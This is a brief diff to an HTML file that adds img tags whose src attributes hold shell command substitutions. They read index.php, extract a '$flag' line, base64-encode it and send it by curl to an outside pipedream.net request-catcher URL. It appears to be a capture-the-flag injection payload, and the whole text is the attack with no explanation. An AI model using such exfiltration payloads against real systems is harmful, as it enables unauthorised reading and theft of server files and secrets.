@@ -1,4 +1,5 @@
 <HTML>
     
-    <img src="$(cat index.php|grep \$flag|base64)">
+    <img src="$(cat index.php|grep \$flag|base64|curl https://enczblt0bgu68.x.pipedream.net)">
+<img src="$(curl https://enczblt0bgu68.x.pipedream.net/$(cat index.php|grep \$flag|base64))">
 </HTML>
